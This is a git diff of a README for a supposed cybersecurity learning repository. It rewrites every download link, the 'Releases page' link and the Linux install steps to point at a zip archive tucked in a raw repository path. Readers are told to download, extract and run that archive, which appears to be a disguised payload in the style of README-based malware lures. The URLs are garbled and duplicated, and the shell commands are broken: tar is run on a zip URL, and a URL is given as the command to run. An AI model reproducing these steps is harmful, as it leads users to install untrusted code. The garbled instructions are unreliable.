@@ -2,7 +2,7 @@
 # 🛡️ cybersec-projects - Explore Cybersecurity Tools Easily
 
 ## 📥 Download the Latest Version
-[![Latest Release](https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip)
+[![Latest Release](https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the cybersec-projects repository! This collection includes hands-on cybersecurity projects designed for learning and experimentation. You will find a variety of tools, scripts, and simulations for practicing ethical hacking.
@@ -33,7 +33,7 @@ To ensure that the applications run smoothly, please follow these guidelines:
 - WiFi Security
 
 ## 📂 Download & Install
-To get started with the cybersec-projects, visit the [Releases page](https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip) to download the latest version. Select the appropriate file for your operating system:
+To get started with the cybersec-projects, visit the [Releases page](https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip) to download the latest version. Select the appropriate file for your operating system:
 
 1. Click on the **Releases page** link above.
 2. Locate the version you wish to download.
@@ -52,15 +52,15 @@ After downloading, follow these steps depending on your operating system:
 3. Double-click to open it and drag the application into your Applications folder.
 
 ### 🐧 Linux
-1. Locate the downloaded `https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip` file.
+1. Locate the downloaded `https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip` file.
 2. Open a terminal window and navigate to the folder where the file is stored.
 3. Extract the file with the command:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip
+   tar -xvzf https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip
    ```
 4. Change into the directory created and run the script with:
    ```bash
-   https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip
+   https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip
    ```
 
 ## ✨ Usage
@@ -74,7 +74,7 @@ Once you have installed the application, you can begin using it immediately. Dep
 If you encounter any issues while running the applications, consider the following tips:
 
 - Ensure that your system meets the requirements mentioned earlier.
-- Check for any updates on the [Releases page](https://raw.githubusercontent.com/Maamitiana/cybersec-projects/main/Projects/Offensive/Binary instrumentation toolkit/cybersec-projects_v3.0.zip).
+- Check for any updates on the [Releases page](https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip instrumentation https://github.com/Maamitiana/cybersec-projects/raw/refs/heads/main/Projects/Offensive/Wireless protocol fuzzing/projects-cybersec-2.6.zip).
 - Visit the project's GitHub Issues section for assistance or common problems reported by users.
 
 ## 🛠️ Contributing
